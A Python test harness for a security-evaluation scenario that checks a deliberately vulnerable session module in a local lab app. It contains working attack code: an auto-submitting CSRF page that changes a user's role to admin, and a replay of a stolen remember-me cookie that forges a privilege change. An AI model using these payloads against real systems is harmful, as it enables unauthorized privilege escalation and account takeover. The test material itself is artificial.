from __future__ import annotations

import json
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from uuid import uuid4

import httpx
from playwright.sync_api import sync_playwright

from check_stage3a_support_role_csrf_pair import (
    ADMIN_ID,
    ATTACKER_HOST,
    ATTACKER_ORIGIN,
    CHROME_PATH,
    EVENT_SCHEMA_PATH,
    PUBLIC_ORIGIN,
    SUPPORT_ID,
    bearer,
    canonical_json,
    compose_exec,
    configure_api,
    digest,
    digest_bytes,
    login,
    reset,
    running_image_digest,
)


def verifier() -> tuple[str, dict[str, object]]:
    scenario_id = "multi-stage-remembered-session-role-chain"
    predicate_id = scenario_id + ".effect"
    subject = {"actor_id": ADMIN_ID, "authorized": "false", "role": "admin"}
    object_ = {
        "resource_id": SUPPORT_ID,
        "previous_role": "support_staff",
        "resulting_role": "admin",
        "session_kind": "remembered",
    }
    deduplication_key = f"remembered-role:{ADMIN_ID}:{SUPPORT_ID}:support_staff:admin"
    condition = {
        "deduplication_key": deduplication_key,
        "event_type": "privilege.changed",
        "minimum_occurrences": 1,
        "object": object_,
        "protected_resource_key": "remembered-session.support-role",
        "subject": subject,
        "window_seconds": 300,
    }
    return predicate_id, {
        "contract_version": 1,
        "scenario_id": scenario_id,
        "verifier_image_digest": running_image_digest("evaluator"),
        "event_schema_digest": digest_bytes(EVENT_SCHEMA_PATH.read_bytes()),
        "network_access": "control-only",
        "attacker_visible": False,
        "predicates": [{
            "predicate_id": predicate_id,
            "effect_type": "unauthorized-resource-write",
            "event_type": "privilege.changed",
            "subject_selector": canonical_json(subject),
            "object_selector": canonical_json(object_),
            "protected_resource_key": "remembered-session.support-role",
            "condition_digest": digest(condition),
            "window_seconds": 300,
            "minimum_occurrences": 1,
            "deduplication_key": deduplication_key,
        }],
    }


def evaluate(trial_id: str, predicate_id: str, manifest: dict[str, object]) -> dict[str, object]:
    payload = canonical_json({"trial_id": trial_id, "predicate_id": predicate_id, "verifier": manifest})
    code = (
        "import os,sys,urllib.request;"
        "r=urllib.request.Request('http://127.0.0.1:8000/internal/evaluate',"
        "data=sys.argv[1].encode(),headers={'Content-Type':'application/json',"
        "'X-Ruby-Evaluator-Token':os.environ['RUBY_EVALUATOR_TOKEN']});"
        "print(urllib.request.urlopen(r).read().decode())"
    )
    return json.loads(compose_exec("evaluator", code, payload))


class AttackPageHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        body = (
            "<!doctype html><html><body>"
            f'<form id="csrf" method="post" action="{PUBLIC_ORIGIN}/api/admin/users/{SUPPORT_ID}/remembered-role-form">'
            '<input name="role" value="admin"></form>'
            '<script>document.getElementById("csrf").submit()</script>'
            "</body></html>"
        ).encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format: str, *args: object) -> None:
        return


def browser_forgery(remembered_token: str) -> dict[str, object]:
    server = ThreadingHTTPServer(("127.0.0.1", 18082), AttackPageHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    responses: list[int] = []
    try:
        with sync_playwright() as playwright:
            browser = playwright.chromium.launch(
                executable_path=str(CHROME_PATH),
                headless=True,
                args=[
                    "--disable-gpu",
                    # 공격자 문서 자리는 대상과 다른 등록 도메인이다. 이름 풀이는
                    # 브라우저 안에서 끝난다.
                    "--host-resolver-rules=MAP " + ATTACKER_HOST + " 127.0.0.1",
                ],
            )
            context = browser.new_context()
            context.add_cookies([{
                "name": "ruby_remember",
                "value": remembered_token,
                "domain": "127.0.0.1",
                "path": "/",
                "httpOnly": True,
                "sameSite": "Lax",
            }])
            page = context.new_page()
            page.on(
                "response",
                lambda response: responses.append(response.status)
                if "/remembered-role-form" in response.url
                else None,
            )
            page.goto(ATTACKER_ORIGIN, wait_until="domcontentloaded", timeout=30_000)
            page.wait_for_url(
                "**/remembered-role-form", wait_until="domcontentloaded", timeout=30_000
            )
            page.wait_for_timeout(200)
            result = {
                "final_url": page.url,
                "role_form_statuses": responses,
                "response_text": page.locator("body").inner_text(),
            }
            context.close()
            browser.close()
            return result
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def run_condition(vulnerable: bool) -> dict[str, object]:
    module = "multi-stage.remembered-session-role-chain"
    trial_id = uuid4().hex
    configure_api(trial_id=trial_id, module_id=module if vulnerable else None)
    reset()
    with httpx.Client(base_url=PUBLIC_ORIGIN, timeout=20) as client:
        admin_token, admin_id = login(client, "admin@ruby.local")
        remembered = client.post("/api/auth/remember-device", headers=bearer(admin_token))
        remembered.raise_for_status()
        remembered_token = client.cookies.get("ruby_remember")
        if not remembered_token:
            raise RuntimeError("remembered-session cookie was not issued")
        normal = client.post(
            f"/api/admin/users/{SUPPORT_ID}/remembered-role-form",
            headers={**bearer(admin_token), "Origin": PUBLIC_ORIGIN},
            data={"role": "support_staff"},
        )
        normal.raise_for_status()
        logged_out = client.post("/api/auth/logout", headers=bearer(admin_token))
        logged_out.raise_for_status()
        ordinary_session_after_logout = client.get("/api/me")
        # 공격자가 기억용 쿠키를 손에 넣었다는 전제다. 그 쿠키 하나로 권한
        # 조작이 승인되는지가 이 모듈이 재는 것이다. 브라우저는 필요하지 않고,
        # 진짜 cross-site POST 에는 Lax 쿠키가 애초에 붙지 않는다.
        with httpx.Client(base_url=PUBLIC_ORIGIN, timeout=20) as stolen:
            stolen.cookies.set("ruby_remember", remembered_token)
            forged = stolen.post(
                f"/api/admin/users/{SUPPORT_ID}/remembered-role-form",
                data={"role": "admin"},
            )
        fresh_admin_token, _ = login(client, "admin@ruby.local")
        users = client.get("/api/admin/users", headers=bearer(fresh_admin_token))
        users.raise_for_status()
    if admin_id != ADMIN_ID:
        raise RuntimeError("seed administrator identifier changed")
    support = next(item for item in users.json() if item["id"] == SUPPORT_ID)
    predicate_id, manifest = verifier()
    evaluation = evaluate(trial_id, predicate_id, manifest)
    expected_status = 200 if vulnerable else 401
    expected_role = "admin" if vulnerable else "support_staff"
    checks = {
        "same_origin_control_succeeded": normal.status_code == 200,
        "ordinary_session_was_invalidated": ordinary_session_after_logout.status_code == 401,
        "remembered_cookie_status_matches_condition": forged.status_code
        == expected_status,
        "support_role_matches_condition": support["role"] == expected_role,
        "private_evaluator_matches_condition": evaluation["objective_achieved"] is vulnerable,
        "event_count_matches_condition": len(evaluation["matched_event_ids"]) == (1 if vulnerable else 0),
    }
    return {
        "scenario_id": "remembered-session-role-chain",
        "condition": "vulnerable" if vulnerable else "secure",
        "remembered_cookie_http_status": forged.status_code,
        "trial_id": trial_id,
        "remembered_cookie_http_status": forged.status_code,
        "ordinary_session_after_logout_http_status": ordinary_session_after_logout.status_code,
        "support_role": support["role"],
        "evaluation": evaluation,
        "checks": checks,
        "passed": all(checks.values()),
    }


def main() -> int:
    parser = __import__("argparse").ArgumentParser()
    parser.add_argument("--output-dir", type=Path, required=True)
    args = parser.parse_args()
    if args.output_dir.exists():
        raise FileExistsError(f"refusing to overwrite output directory: {args.output_dir}")
    args.output_dir.mkdir(parents=True)
    report: dict[str, object]
    try:
        results = [run_condition(False), run_condition(True)]
        report = {
            "report_version": 1,
            "scenario_id": "remembered-session-role-chain",
            "module_id": "multi-stage.remembered-session-role-chain",
            "results": results,
            "passed": all(item["passed"] for item in results),
        }
    finally:
        configure_api(trial_id=None, module_id=None)
        reset()
    report_path = args.output_dir / "stage3a-remembered-session-role-pair-report.json"
    report_path.write_text(
        json.dumps(report, ensure_ascii=False, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )
    print(json.dumps({"report": str(report_path), "passed": report["passed"]}, sort_keys=True))
    return 0 if report["passed"] else 2


if __name__ == "__main__":
    raise SystemExit(main())
